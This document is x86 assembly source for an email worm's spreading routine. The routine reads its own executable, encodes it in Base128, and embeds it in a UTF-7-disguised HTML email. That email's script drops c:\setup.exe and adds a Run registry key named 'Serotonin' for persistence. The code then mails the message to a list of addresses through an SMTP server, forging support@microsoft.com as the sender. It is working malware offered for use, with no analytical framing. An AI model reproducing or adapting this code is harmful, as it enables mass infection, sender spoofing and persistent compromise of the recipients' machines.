;Descr:	This gen spreads the worm to given email addresses using UTF-7 trick
;
;Type:	GEN_SPREADWORM
;
;INPUT:
;(EBX)	DWORD	address of an array of email addresses
;
;OUTPUT:
;(EAX)	DWORD	number of sent email messages
;

spread_worm	Proc
	pushad
	@SEH_SetupFrame	<jmp	sw_seh>

	call	sw_delta
sw_delta:
	pop	ebp				;EBP = delta offset
	mov	[ebp + sw_ebx - sw_delta],ebx

	and	dword ptr [ebp + sw_count - sw_delta],0
	@pushsz	'KERNEL32'
	call	esi				;get address of KERNEL32.DLL
	xchg	eax,ebx

	@pushsz	'FreeLibrary'
	push	ebx
	call	edi				;and of its APIz...
	mov	[ebp + sw_FreeLibrary - sw_delta],eax
	@pushsz	'VirtualAlloc'
	push	ebx
	call	edi				; ---- " "----
	mov	[ebp + sw_VirtualAlloc - sw_delta],eax
	@pushsz	'VirtualFree'
	push	ebx
	call	edi				; ---- " "----
	mov	[ebp + sw_VirtualFree - sw_delta],eax
	@pushsz	'GetSystemDirectoryA'
	push	ebx
	call	edi				; ---- " "----
	mov	[ebp + sw_GetSystemDirectoryA - sw_delta],eax
	@pushsz	'GetFileSize'
	push	ebx
	call	edi				; ---- " "----
	mov	[ebp + sw_GetFileSize - sw_delta],eax
	@pushsz	'CreateFileA'
	push	ebx
	call	edi				; ---- " "----
	mov	[ebp + sw_CreateFileA - sw_delta],eax
	@pushsz	'ReadFile'
	push	ebx
	call	edi				; ---- " "----
	mov	[ebp + sw_ReadFile - sw_delta],eax
	@pushsz	'CloseHandle'
	push	ebx
	call	edi				; ---- " "----
	mov	[ebp + sw_CloseHandle - sw_delta],eax
	@pushsz	'GetDateFormatA'
	push	ebx
	call	edi				; ---- " "----
	mov	[ebp + sw_GetDateFormatA - sw_delta],eax
	@pushsz	'GetTimeFormatA'
	push	ebx
	call	edi				; ---- " "----
	mov	[ebp + sw_GetTimeFormatA - sw_delta],eax
	@pushsz	'LoadLibraryA'
	push	ebx
	call	edi				; ---- " "----

	@pushsz	'WSOCK32'
	call	eax				;get address of WSOCK32.DLL
	test	eax,eax
	je	sw_seh
	xchg	eax,ebx
	mov	[ebp + sw_wsock32 - sw_delta],ebx

	@pushsz	'WSACleanup'
	push	ebx
	call	edi				;and of its APIz...
	mov	[ebp + sw_WSACleanup - sw_delta],eax
	@pushsz	'socket'
	push	ebx
	call	edi
	mov	[ebp + sw_socket - sw_delta],eax
	@pushsz	'closesocket'
	push	ebx
	call	edi
	mov	[ebp + sw_closesocket - sw_delta],eax
	@pushsz	'gethostbyname'
	push	ebx
	call	edi
	mov	[ebp + sw_gethostbyname - sw_delta],eax
	@pushsz	'connect'
	push	ebx
	call	edi
	mov	[ebp + sw_connect - sw_delta],eax
	@pushsz	'recv'
	push	ebx
	call	edi
	mov	[ebp + sw_recv - sw_delta],eax
	@pushsz	'send'
	push	ebx
	call	edi
	mov	[ebp + sw_send - sw_delta],eax
	@pushsz	'WSAStartup'
	push	ebx
	call	edi

	call	@sw_wsadata
	db	398 dup (?)
@sw_wsadata:
	push	101h
	call	eax				;initialize WSOCK32
	test	eax,eax
	je	sw_ok_wsa
	ret					;quit if error

sw_ok_wsa:
	push	MAX_PATH-14
	call	sw_path
	db	MAX_PATH dup (?)
sw_path:pop	edi
	push	edi
	mov	eax,12345678h
sw_GetSystemDirectoryA = dword ptr $-4
	call	eax				;call GetSystemDirectoryA
	push	edi
	add	edi,eax
	mov	eax,'niw\'			;construct %sysdir%\win32ser.exe
	stosd
	mov	eax,'es23'
	stosd
	mov	eax,'xe.r'
	stosd
	mov	ax,'e'
	stosw
	pop	edi				;edi = path\filename of worm on the disk

	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_ALWAYS
	push	0
	push	FILE_SHARE_READ or FILE_SHARE_WRITE
	push	GENERIC_READ
	push	edi
	mov	eax,12345678h
sw_CreateFileA = dword ptr $-4
	call	eax				;open file
	inc	eax
	je	sw_endwsock
	dec	eax
	mov	[ebp + sw_fHandle - sw_delta],eax

	push	0
	push	eax
	mov	eax,12345678h
sw_GetFileSize = dword ptr $-4
	call	eax				;get its size
	push	eax

	push	PAGE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	eax
	push	0
	mov	eax,12345678h
sw_VirtualAlloc = dword ptr $-4
	call	eax				;allocate memory for file
	mov	[ebp + sw_file_mem - sw_delta],eax
	xchg	eax,esi				;address in ESI

	lea	edi,[ebp + sw_date - sw_delta]
	push	17
	push	edi
	@pushsz	'ddd, dd MMM yyyy '
	push	0
	push	0
	push	9
	mov	eax,12345678h
sw_GetDateFormatA = dword ptr $-4
	call	eax				;get formatted date
	add	edi,17
	push	8
	push	edi
	@pushsz	'HH:mm:ss '
	push	0
	push	0
	push	9
	mov	eax,12345678h
sw_GetTimeFormatA = dword ptr $-4
	call	eax				;and time

	push	0
	call	@sw_read
	dd	?
@sw_read:
	push	dword ptr [esp+8]
	push	esi
	push	dword ptr [ebp + sw_fHandle - sw_delta]
	mov	eax,12345678h
sw_ReadFile = dword ptr $-4
	call	eax				;read file to memory

	push	12345678h
sw_fHandle = dword ptr $-4
	mov	eax,12345678h
sw_CloseHandle = dword ptr $-4
	call	eax				;close it

	pop	eax
	push	eax

	imul	eax,9				;calculate new (bigger) size
	xor	edx,edx				;of memory for email message
	push	7
	pop	ecx
	div	ecx
	add	eax,sw_mail_prolog_size+sw_script_size

	push	PAGE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	eax
	push	0
	call	[ebp + sw_VirtualAlloc - sw_delta]
	mov	[ebp + sw_mail_memory - sw_delta],eax
	xchg	eax,edi				;allocate memory, address in EDI

	push	esi
	call	@sw_mail_prolog

sw_mail_prolog:

	db	'Date: '			;date field
sw_date	db	25 dup (' '),CRLF
	db	'Importance: High',CRLF,CRLF	;importance field


;UTF-7 encoded:
;<META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
;<textarea id=ss rows=1 cols=1>

	db	'+/v/-'
	db	'+ADwATQBFAFQAQQAgAGgAdAB0AHAALQBlAHEAdQBpAHYAPQAiAEMAbwB'
	db	'uAHQAZQBuAHQALQBUAHkAcABlACIAIABjAG8AbgB0AGUAbgB0AD0AIgB'
	db	'0AGUAeAB0AC8AaAB0AG0AbAA7ACAAYwBoAGEAcgBzAGUAdAA9AEkAUwB'
	db	'PAC0AOAA4ADUAOQAtADEAIgA+ADwAdABlAHgAdABhAHIAZQBhACAAaQB'
	db	'kAD0AcwBzACAAcgBvAHcAcwA9ADEAIABjAG8AbABzAD0AMQA+-'

@sw_mail_prolog:
sw_mail_prolog_size = @sw_mail_prolog-sw_mail_prolog
	pop	esi
	push	sw_mail_prolog_size
	pop	ecx
	rep	movsb				;copy to memory
	pop	esi

	pop	eax
	add	eax,6
	push	7
	pop	ecx
	xor	edx,edx
	div	ecx
	xchg	eax,ecx



;encode worm file content to Base128 (will be stored inside <textarrea></textarrea> tagz)

sw_wren	macro	bits
	rol     eax,bits
	and     al,07Fh
	add     al,40h	; 00-3F => 40-7F, 40-7F => C0-FF
	or      al,40h
	stosb
endm

sw_BASE128:
	lodsd				;load bytes 0,1,2,3
	dec	esi
	dw	0C80Fh			;BSWAP	EAX
	sw_wren	7			;bits 0-6
	sw_wren	7			;bits 7-13
	sw_wren	7			;bits 14-20
	sw_wren	7			;bits 21-27
	lodsd                           ;load bytes 3,4,5,6
	dw	0C80Fh			;BSWAP	EAX
	sw_wren	11			;bits 28-34
	sw_wren	7			;bits 35-41
	sw_wren	7			;bits 42-48
	sw_wren	7			;bits 49-55
	test	cl,1Fh
	jne	sw_BASE128_next
	mov	ax,0A0Dh		;put CRLF, line has length 256 characters
	stosw				;...
sw_BASE128_next:
	dec	ecx			;decrement counter
	jne	sw_BASE128		;[loop]

	push	MEM_RELEASE
	push	0
	push	12345678h
sw_file_mem = dword ptr $-4
	mov	eax,12345678h
sw_VirtualFree = dword ptr $-4
	call	eax			;dealloc memory for worm file

	call	@sw_script_data

sw_script_data:


;UTF-7 encoded:
;</textarea>
;<script language=vbs>
;Sub vc(x1,x2,x3,x4,x5,x6,x7)
;fil.Write chr(x1)&chr(x2)&chr(x3)&chr(x4)&chr(x5)&chr(x6)&chr(x7)
;End Sub</script><script language=jscript>
;fso = new ActiveXObject("Scripting.FileSystemObject");
;fil = fso.CreateTextFile("c:\\setup.exe");s=ss.value.replace(/(<BR>)|\s/g,"");r=s.length;
;for(w=n=0;n<r;){u=z()|z()|z()|z();v=z()|z()|z()|z();
;vc(u>>20,u>>12&255,u>>4&255,u<<4&240|v>>24,v>>16&255,v>>8&255,v&255)}
;fil.Close();
;h = new ActiveXObject("WScript.Shell");
;h.RegWrite ("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Serotonin",wf);
;function z(){b=s.charCodeAt(n++);return(b&(b>>1|63))<<(w=w?w-7:21)}
;</script>

	db	CRLF
	db	'+ADwALwB0AGUAeAB0AGEAcgBlAGEAPgANAAoAPABzAGMAcgBpAHAAdAA'
	db	'gAGwAYQBuAGcAdQBhAGcAZQA9AHYAYgBzAD4ADQAKAFMAdQBiACAAdgB'
	db	'jACgAeAAxACwAeAAyACwAeAAzACwAeAA0ACwAeAA1ACwAeAA2ACwAeAA'
	db	'3ACkADQAKAGYAaQBsAC4AVwByAGkAdABlACAAYwBoAHIAKAB4ADEAKQA'
	db	'mAGMAaAByACgAeAAyACkAJgBjAGgAcgAoAHgAMwApACYAYwBoAHIAKAB'
	db	'4ADQAKQAmAGMAaAByACgAeAA1ACkAJgBjAGgAcgAoAHgANgApACYAYwB'
	db	'oAHIAKAB4ADcAKQANAAoARQBuAGQAIABTAHUAYgA8AC8AcwBjAHIAaQB'
	db	'wAHQAPgANAAoAPABzAGMAcgBpAHAAdAAgAGwAYQBuAGcAdQBhAGcAZQA'
	db	'9AGoAcwBjAHIAaQBwAHQAPgBmAHMAbwAgAD0AIABuAGUAdwAgAEEAYwB'
	db	'0AGkAdgBlAFgATwBiAGoAZQBjAHQAKAAiAFMAYwByAGkAcAB0AGkAbgB'
	db	'nAC4ARgBpAGwAZQBTAHkAcwB0AGUAbQBPAGIAagBlAGMAdAAiACkAOwB'
	db	'3AGYAPQAiAGMAOgBcAFwAcwBlAHQAdQBwAC4AZQB4AGUAIgA7AC8ALw-'
	db	CRLF
	db	'+AGYAaQBsACAAPQAgAGYAcwBvAC4AQwByAGUAYQB0AGUAVABlAHgAdAB'
	db	'GAGkAbABlACgAdwBmACkAOwBzAD0AcwBzAC4AdgBhAGwAdQBlAC4AcgB'
	db	'lAHAAbABhAGMAZQAoAC8AKAA8AEIAUgA+ACkAfABcAHMALwBnACwAIgA'
	db	'iACkAOwByAD0AcwAuAGwAZQBuAGcAdABoADsAZgBvAHIAKAB3AD0AbgA'
	db	'9ADAAOwBuADwAcgA7ACkAewB1AD0AegAoACkAfAB6ACgAKQB8AHoAKAA'
	db	'pAHwAegAoACkAOwB2AD0AegAoACkAfAB6ACgAKQB8AHoAKAApAHwAegA'
	db	'oACkAOwB2AGMAKAB1AD4APgAyADAALAB1AD4APgAxADIAJgAyADUANQA'
	db	'sAHUAPgA+ADQAJgAyADUANQAsAHUAPAA8ADQAJgAyADQAMAB8AHYAPgA'
	db	'+ADIANAAsAHYAPgA+ADEANgAmADIANQA1ACwAdgA+AD4AOAAmADIANQA'
	db	'1ACwAdgAmADIANQA1ACkAfQBmAGkAbAAuAEMAbABvAHMAZQAoACkAOwB'
	db	'oACAAPQAgAG4AZQB3ACAAQQBjAHQAaQB2AGUAWABPAGIAagBlAGMAdAA'
	db	'oACIAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkAOwAvAC8-'
	db	CRLF
	db	'+AGgALgBSAGUAZwBXAHIAaQB0AGUAKAAiAEgASwBFAFkAXwBDAFUAUgB'
	db	'SAEUATgBUAF8AVQBTAEUAUgBcAFwAUwBvAGYAdAB3AGEAcgBlAFwAXAB'
	db	'NAGkAYwByAG8AcwBvAGYAdABcAFwAVwBpAG4AZABvAHcAcwBcAFwAQwB'
	db	'1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAXABSAHUAbgBcAFwAUwB'
	db	'lAHIAbwB0AG8AbgBpAG4AIgAsAHcAZgApADsAZgB1AG4AYwB0AGkAbwB'
	db	'uACAAegAoACkAewBiAD0AcwAuAGMAaABhAHIAQwBvAGQAZQBBAHQAKAB'
	db	'uACsAKwApADsAcgBlAHQAdQByAG4AKABiACYAKABiAD4APgAxAHwANgA'
	db	'zACkAKQA8ADwAKAB3AD0AdwA/AHcALQA3ADoAMgAxACkAfQA8AC8AcwB'
	db	'jAHIAaQBwAHQAPg-'
	db	CRLF,0

@sw_script_data:
sw_script_size = @sw_script_data-sw_script_data
	pop	esi
	mov	ecx,sw_script_size
	rep	movsb				;copy to memory

	mov	esi,12345678h			;ptr to email addresses
sw_ebx = dword ptr $-4
sw_l_sendmail:
	push	esi
	call	sw_sendmail			;send constructed email to email address
	pop	esi
	@endsz					;get next email address
	movzx	ecx,byte ptr [esi]		;ECX=0 if it was the last one
	jecxz	sw_e_sendmail			;yeah, quit
	jmp	sw_l_sendmail			;no, send to next email address



sw_e_sendmail:
	push	MEM_RELEASE
	push	0
	push	12345678h
sw_mail_memory = dword ptr $-4
	call	[ebp + sw_VirtualFree - sw_delta]

						;deallocate memory for mail message

sw_endwsock:
	mov	eax,12345678h
sw_WSACleanup = dword ptr $-4
	call	eax				;unitialize WSOCK32

	push	12345678h
sw_wsock32 = dword ptr $-4
	mov	eax,12345678h
sw_FreeLibrary = dword ptr $-4
	call	eax				;unload WSOCK32.dll

sw_seh:	@SEH_RemoveFrame
	popad
	mov	eax,12345678h			;return count of sent emailz
sw_count = dword ptr $-4
sw_endwsa:
	ret






;this procedure sends one infected email to specified email address

sw_sendmail	Proc
	push	0
	push	1
	push	2
	mov	eax,12345678h
sw_socket = dword ptr $-4
	call	eax				;create socket
	inc	eax
	je	sw_endwsa
	dec	eax
	mov	[ebp + sw_hSocket - sw_delta],eax

	@pushsz	'smtp.iol.cz'			;smtp server
	mov	eax,12345678h
sw_gethostbyname = dword ptr $-4
	call	eax				;resolve host
	test	eax,eax
	je	sw_endsocket
	mov	eax,[eax+14h]
	mov	eax,[eax]
	mov	[ebp + sw_saddr - sw_delta],eax	;EAX = IP address of smtp.iol.cz

	push	@wsocket-wsocket
	call	@wsocket

wsocket:	dw	2
		dw	1900h			;25 port (SMTP)
sw_saddr	dd	?			;IP address of SMTP server
		db	8 dup (?)

@wsocket:
	push	dword ptr [ebp + sw_hSocket - sw_delta]
	mov	eax,12345678h
sw_connect = dword ptr $-4
	call	eax				;connect to IP
	inc	eax
	je	sw_endsocket
	call	sw_get_response			;get response
	jc	sw_endsocket			;quit if error

	call	@sw_cmd_helo
	db	'HELO support',CRLF
@sw_cmd_helo:
	pop	ebx
	push	14
	pop	ecx
	call	sw_writesocket			;send HELO command
	call	sw_get_response			;get response
	jc	sw_endsocket			;quit if error

	call	@sw_cmd_mailfrom
	db	'MAIL FROM:<support@microsoft.com>',CRLF
@sw_cmd_mailfrom:
	pop	ebx
	push	35
	pop	ecx
	call	sw_writesocket			;send MAIL FROM command
	call	sw_get_response			;get response
	jc	sw_endsocket			;quit if error

	call	@sw_cmd_rcptto
	db	'RCPT TO: <'
@sw_cmd_rcptto:
	pop	ebx
	push	10
	pop	ecx
	call	sw_writesocket			;send "RCPT TO: <"

	call	sw_strlen
	mov	ebx,esi
	call	sw_writesocket			;send "[email address]"

	call	@sw_break
	db	'>',CRLF
@sw_break:
	pop	ebx
	push	3
	pop	ecx
	call	sw_writesocket			;send ">"

	call	sw_get_response			;get response
	jc	sw_endsocket			;quit if error

	call	@sw_cmd_data
	db	'DATA',CRLF
@sw_cmd_data:
	pop	ebx
	push	6
	pop	ecx
	call	sw_writesocket			;send DATA command
	call	sw_get_response			;get response
	jc	sw_endsocket			;quit if error

	mov	esi,[ebp + sw_mail_memory - sw_delta]
	call	sw_strlen			;get size of mail message
	mov	ebx,esi
	call	sw_writesocket			;send mail message

	call	@sw_cmd_term
	db	CRLF,'.',CRLF
@sw_cmd_term:
	pop	ebx
	push	5
	pop	ecx
	call	sw_writesocket			;send mail terminator
	call	sw_get_response			;get response
	jc	sw_endsocket			;quit if error

	call	@sw_cmd_quit
	db	'QUIT',CRLF
@sw_cmd_quit:
	pop	ebx
	push	6
	pop	ecx
	call	sw_writesocket			;send QUIT command


	;increment counter of successful infections
	inc	dword ptr [ebp + sw_count - sw_delta]

sw_endsocket:
	push	12345678h
sw_hSocket = dword ptr $-4
	mov	eax,12345678h
sw_closesocket = dword ptr $-4
	call	eax				;close connection
	ret
sw_sendmail	EndP






;this procedure can get length of string

sw_strlen:
	push	esi
	xor	ecx,ecx
	lodsb
sw_l_sl:inc	ecx
	lodsb
	test	al,al
	jne	sw_l_sl
	pop	esi
	ret



;this procedure can write data to socket

sw_writesocket:
	push	0
	push	ecx				;ECX = size of data
	push	ebx				;EBX = ptr to data
	push	dword ptr [ebp + sw_hSocket - sw_delta]
	mov	eax,12345678h
sw_send = dword ptr $-4
	call	eax
	ret



;this procedure can read response from the server

sw_get_response:
	push	0
	push	4
	call	@sw_response
	dd	?
@sw_response:
	push	dword ptr [ebp + sw_hSocket - sw_delta]
	mov	eax,12345678h
sw_recv = dword ptr $-4
	call	eax				;get stmp server error code (4 bytez)
	cmp	eax,4
	jne	sw_err_r

sw_r_loop:
	push	0
	push	1
	call	@sw_response_break
	db	?
@sw_response_break:
	pop	ebx
	push	ebx
	push	dword ptr [ebp + sw_hSocket - sw_delta]
	call	[ebp + sw_recv - sw_delta]
	jne	sw_err_r
	cmp	byte ptr [ebx],0Ah
	jne	sw_r_loop			;skip over CRLF
	mov	eax,[ebp + @sw_response-4 - sw_delta]
	cmp	eax,' 022'			;analyse error codez
	je	sw_ok_r
	cmp	eax,' 052'
	je	sw_ok_r
	cmp	eax,' 152'
	je	sw_ok_r
	cmp	eax,' 453'
	jne	sw_err_r
sw_ok_r:clc
	ret
sw_err_r:
	stc
	ret
end_spread_worm:
spread_worm	EndP